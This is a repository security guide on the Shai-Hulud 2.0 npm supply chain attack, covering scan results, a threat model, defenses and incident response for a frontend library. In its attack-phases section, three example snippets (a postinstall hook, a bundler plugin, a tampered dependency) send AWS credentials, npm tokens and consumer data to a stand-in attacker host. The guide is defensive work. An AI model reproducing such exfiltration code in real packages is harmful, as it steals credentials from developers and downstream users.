# NPM Supply Chain Attack - Security Response Guide

## Scan Results: ✅ No Compromise Detected

**Scan Date:** November 26, 2025  
**Status:** No critical security issues found  
**Coverage:** Includes detection for Shai-Hulud 2.0 attack (425+ packages, Nov 2025)

The automated security scan of your npm dependencies completed successfully with no indicators of compromise detected.

## Recent Threat: Shai-Hulud 2.0 (November 2025)

A new npm supply chain attack compromised over **425 packages** with more than 100 million monthly downloads, including:
- AsyncAPI packages
- ENS (Ethereum Name Service) domain tools
- Zapier and Postman API tools
- PostHog analytics packages
- Various low-code/no-code platform integrations

**Attack Method:** The malware searches compromised repositories for credentials and publishes them on GitHub under repositories named "Shai-Hulud: the Second Coming".

**Detection:** Our scanner now includes all 425+ known compromised packages from this attack.

**Source:** [Heise.de article (German)](https://www.heise.de/news/Shai-Hulud-2-Neue-Version-des-NPM-Wurms-greift-auch-Low-Code-Plattformen-an-11089607.html)

## Data Protection: Understanding the Threat Model

### What npm Compromises Can and Cannot Access

#### ❌ **NOT At Risk** (Protected by Nature of Library)

As a **public frontend library**, reev-frontend-lib has limited attack surface:

- **No backend infrastructure** - This is a pure frontend library
- **No database access** - No direct data storage
- **No server secrets** - Library code runs in consuming applications
- **Published code** - All code is public and auditable

**Why it's safer:**
- Library code is publicly visible on GitHub and npm
- No runtime server infrastructure to compromise
- Consuming applications control deployment and security

#### ⚠️ **Potentially At Risk** (Development Environment)

**CRITICAL FOR DEVELOPERS:** Malicious code could compromise your development environment.

Malicious frontend code could access:

- **Developer credentials** - GitHub tokens, AWS keys, npm tokens in your environment
- **Source code** - Access to private repositories you're working on
- **SSH keys** - Keys stored on your development machine
- **CI/CD secrets** - Credentials used in automated builds
- **Consumer applications** - If malicious code makes it into the built library

**Real-world impact:** 
- **MEDIUM-HIGH** - Developer credential theft
- Malicious code could be bundled into the library and affect downstream consumers
- Could affect applications that use this library (varfish-server, reev, etc.)
- Exfiltration of credentials could compromise other projects

**Supply chain risk:**
- Applications consuming this library trust its code
- Malicious code could propagate to production systems using this library
- Potential impact on genomic data applications that depend on this library

### Attack Phases and Your Protection

#### 1. **Install-Time Attacks** ✅ Blocked

Most npm attacks (including Shai-Hulud 2.0) use install scripts:

```json
{
  "scripts": {
    "postinstall": "curl attacker.com/steal?data=$(cat ~/.aws/credentials)"
  }
}
```

**Your protection:**
- Pre-build security scan detects known malicious packages
- Developers should use `npm ci --ignore-scripts` or set `ignore-scripts=true` in `~/.npmrc`
- CI/CD builds can run with `--ignore-scripts` flag

**Threat level:** LOW with protections - Scripts can be blocked

#### 2. **Build-Time Code Injection** ⚠️ Mitigated

Compromised build tools could inject malicious code into your bundle:

```javascript
// Malicious bundler plugin
module.exports = {
  transform(code) {
    return code + ';fetch("https://attacker.com?token="+process.env.NPM_TOKEN)';
  }
}
```

**Your protection:**
- Pre-build scanning catches known compromised build tools
- Build happens in CI/CD environment (isolated from local credentials)
- You can audit compiled bundles in `dist/`

**Threat level:** LOW - Requires compromised build dependency + bypassing security scan

#### 3. **Runtime Code in Published Library** 🚨 **MEDIUM RISK**

**This is the primary concern for a library.** Malicious code bundled into the library affects all consumers:

```javascript
// In a compromised dependency used by your library
export function someUtilityFunction(data) {
  // Legitimate functionality
  const result = processData(data);
  
  // Malicious addition - exfiltrates from consuming applications
  try {
    fetch('https://attacker.com/lib-usage', {
      method: 'POST',
      body: JSON.stringify({
        library: '@bihealth/reev-frontend-lib',
        consumer: window.location.hostname,
        data: extractSensitiveInfo()
      })
    });
  } catch {} // Silent failure
  
  return result;
}
```

**Your protection:**
- ✅ Pre-build scan prevents known malicious packages
- ⚠️ Cannot detect zero-day attacks or newly compromised packages
- ⚠️ Code review of 50+ direct dependencies and 1000+ transitive dependencies is impractical

**Threat level:** **MEDIUM** - Library consumers trust your code

**Likelihood:** LOW with current protections, but **consequences affect downstream users**

### What Shai-Hulud 2.0 Actually Targeted

The real-world Shai-Hulud 2.0 attack focused on **developer credentials**, not end-user data:

**Primary targets:**
- `NPM_TOKEN` - To publish more malicious packages
- `GITHUB_TOKEN` - To access and compromise private repositories
- `AWS_ACCESS_KEY` / `AWS_SECRET_ACCESS_KEY` - To access cloud infrastructure
- CI/CD secrets - To compromise build pipelines

**Exfiltration method:**
- Published stolen credentials to public GitHub repositories
- Named repos "Shai-Hulud: the Second Coming"

**Impact on reev-frontend-lib:**
- ✅ **Published library:** Public code, no secrets in repository
- ⚠️ **Developer workstations:** Could leak personal GitHub/AWS credentials
- ⚠️ **CI/CD environment:** Protected by `--ignore-scripts` in builds
- ⚠️ **Downstream consumers:** Could receive compromised library version

### Defense in Depth: Multiple Protection Layers

1. **Pre-build scanning** - Catches known malicious packages before they're installed
2. **Install script blocking** - `--ignore-scripts` prevents install-time attacks
3. **Manual review workflow** - npm updates require human approval
4. **Public codebase** - All code is auditable on GitHub
5. **Regular auditing** - Manual review of dependency updates
6. **Consumer protection** - Applications using this library should implement their own security measures

### Recommended Additional Protections

**For Library Maintainers:**

#### 1. Developer Workstation Security 🚨 **HIGHEST PRIORITY**

Since developer credentials are the primary target:

**Protect developer machines:**
- ✅ Use `~/.npmrc` with `ignore-scripts=true` globally
- ✅ Never store production credentials in local environment variables
- ✅ Use separate npm tokens for publishing (scope to package only)
- ✅ Regular security audits of developer workstations
- ✅ Use 2FA on npm, GitHub, and all development accounts

**Configure global npm to block install scripts:**
```bash
# In ~/.npmrc (applies to all projects)
echo "ignore-scripts=true" >> ~/.npmrc
```

If a developer's machine is compromised:
- Their GitHub/AWS credentials could be stolen
- npm publishing token could be compromised
- SSH keys could be exfiltrated

#### 2. CI/CD Pipeline Security

**GitHub Actions protection:**
- Use minimal scoped tokens
- Separate read and write permissions
- Review workflow files for credential exposure
- Use environment secrets, not repository secrets for sensitive data

#### 3. npm Publishing Security

**Protect the supply chain:**
- Enable 2FA on npm account (required for publishing)
- Use scoped npm tokens (package-specific)
- Review published bundle before releasing
- Consider using `npm pack` to inspect bundle contents

```bash
# Review bundle before publishing
npm pack
tar -tzf bihealth-reev-frontend-lib-*.tgz
```

#### 4. Dependency Hygiene

**Minimize attack surface:**
- Regularly review and remove unused dependencies
- Prefer packages with:
  - Active maintenance
  - Large user base
  - Verified publishers
  - No install scripts
- Document why each dependency is needed

#### 5. Consumer Guidance

**Help applications using this library:**
- Document security expectations in README
- Recommend consumers implement Content Security Policy
- Advise on Subresource Integrity for bundled assets
- Provide security contact for vulnerability reports

**For Consumer Applications (varfish-server, reev, etc.):**

Since this library is used by applications handling sensitive genomic data:

#### 1. Content Security Policy (CSP)
Restrict where frontend JavaScript can make network requests:

```python
# In Django settings
CSP_DEFAULT_SRC = ("'self'",)
CSP_CONNECT_SRC = ("'self'",)  # Blocks fetch/XMLHttpRequest to external domains
```

#### 2. Subresource Integrity (SRI)
Verify library bundle hasn't been tampered with:

```html
<script src="/static/reev-frontend-lib.js" 
        integrity="sha384-..." 
        crossorigin="anonymous"></script>
```

#### 3. Regular Updates with Review
- Monitor for library updates
- Review changelogs before updating
- Test in staging with security monitoring
- Monitor for unexpected network requests

## What We Scanned For

Based on common npm supply chain attack patterns, we checked for:

1. **Suspicious install scripts** - postinstall/preinstall scripts with network calls, eval, or shell commands
2. **Unexpected executable files** - .sh, .bat, .exe files in node_modules
3. **Environment variable exfiltration** - Code accessing sensitive env vars (AWS keys, tokens, secrets)
4. **Known malicious packages** - Packages from previous supply chain attacks (425+ from Shai-Hulud 2.0)
5. **Typosquatting** - Misspelled versions of popular packages
6. **Network activity in install scripts** - HTTP/HTTPS calls during package installation
7. **Non-registry dependencies** - Packages from git URLs or other unusual sources
8. **Recently modified packages** - Unexpected changes to installed packages
9. **NPM cache integrity** - Corruption or tampering with npm cache

## Security Measures Implemented

### 1. Automated Scanning
- **Script:** `utils/scan-npm-compromise.sh`
- **When:** Run manually before accepting dependency updates
- **Action:** Detects known malicious packages and suspicious patterns

### 2. Manual Review Process
- **Status:** NPM updates currently commented out in `.github/dependabot.yml`
- **Control:** Workflow `.github/workflows/dependabot-security.yml` blocks auto-merge for npm updates
- **Review:** All npm dependency PRs require manual security review

### 3. Developer Guidelines
- Use `--ignore-scripts` for npm installs
- Review dependency changes before committing
- Run security scan before publishing new versions

## Additional Security Recommendations

### Immediate Actions (To Be Done)
- [x] Scan repository for compromise indicators
- [x] Add security scanning scripts
- [x] Disable Dependabot auto-merge for npm
- [x] Document security procedures

### Ongoing Best Practices

#### 1. Regular Security Audits
```bash
# Run the comprehensive scan
./utils/scan-npm-compromise.sh

# Check for known vulnerabilities
npm audit

# Review outdated packages
npm outdated
```

#### 2. Before Accepting npm Dependency Updates
- [ ] Review the changelog and release notes
- [ ] Check the package's GitHub repository for suspicious activity
- [ ] Verify the package maintainer hasn't changed
- [ ] Run `./utils/scan-npm-compromise.sh` after updating
- [ ] Review the diff in `package-lock.json` for unexpected changes
- [ ] Check for new postinstall scripts
- [ ] Build and inspect the bundle

#### 3. Package Installation Best Practices
```bash
# Use npm ci instead of npm install in CI/CD
npm ci --ignore-scripts

# Install specific versions, not ranges
npm install package@1.2.3 --save-exact

# Review lock file changes before committing
git diff package-lock.json
```

#### 4. Monitoring & Detection
- Monitor GitHub Security Advisories
- Subscribe to npm security announcements
- Enable GitHub's Dependabot security alerts
- Regularly review `npm audit` output

#### 5. Lockdown Package Installation
Consider adding to `.npmrc`:
```
ignore-scripts=true
package-lock=true
save-exact=true
```

This prevents:
- Postinstall scripts from running automatically
- Accidental package-lock.json changes
- Version range updates that might pull compromised versions

#### 6. Before Publishing New Versions
```bash
# Build the library
npm run build

# Inspect the bundle
npm pack
tar -tzf bihealth-reev-frontend-lib-*.tgz

# Run security scan
./utils/scan-npm-compromise.sh

# Check for unexpected network calls in bundle
grep -r "fetch\|XMLHttpRequest\|\.post\|\.get" dist/

# Verify no credentials in bundle
grep -r "token\|secret\|password\|key" dist/
```

### If You Suspect Compromise

1. **Immediately isolate the environment**
   - Stop development work
   - Disconnect from network if possible

2. **Preserve evidence**
   - Save the scan report
   - Copy node_modules directory
   - Save npm-debug.log if present

3. **Run comprehensive scan**
   ```bash
   ./utils/scan-npm-compromise.sh
   npm audit
   ```

4. **Check for data exfiltration**
   - Review environment variables that may have been exposed
   - Check for unauthorized network connections
   - Audit recent npm publishes

5. **Clean reinstall**
   ```bash
   rm -rf node_modules package-lock.json
   npm cache clean --force
   npm install --ignore-scripts
   ```

6. **Rotate credentials**
   - Change npm publish token
   - Rotate GitHub personal access tokens
   - Update CI/CD secrets
   - Regenerate SSH keys if stored in environment

7. **Notify consumers**
   - If compromised code was published, immediately unpublish or deprecate
   - Create security advisory on GitHub
   - Notify known consumers (varfish-server, reev, etc.)

8. **Report the incident**
   - File issue with npm: https://www.npmjs.com/support
   - Report to GitHub Security: security@github.com
   - Document the incident internally

## Scan Tool Usage

### Basic Scan
```bash
./utils/scan-npm-compromise.sh
```

### Quick Security Check (before updates)
```bash
./utils/npm-security-check.sh
```

### Review Scan Report
```bash
cat npm-security-scan-*.txt
```

### Integration in Workflow
The security check should be run:
- Before accepting any npm dependency update PR
- Before publishing a new library version
- After any suspicious activity
- Quarterly as part of security review

## Security Contact

For security concerns related to this library:
- Create a private security advisory on GitHub
- Email the maintainers directly
- **Do not** disclose vulnerabilities publicly until fixed

## References

- [npm Security Best Practices](https://docs.npmjs.com/about-security-best-practices)
- [GitHub Dependabot Documentation](https://docs.github.com/en/code-security/dependabot)
- [OWASP Software Component Verification Standard](https://owasp.org/www-project-software-component-verification-standard/)
- [Shai-Hulud 2.0 Analysis (Heise.de, German)](https://www.heise.de/news/Shai-Hulud-2-Neue-Version-des-NPM-Wurms-greift-auch-Low-Code-Plattformen-an-11089607.html)

---

**Last Updated:** November 26, 2025  
**Next Review:** After any npm dependency update or quarterly security audit
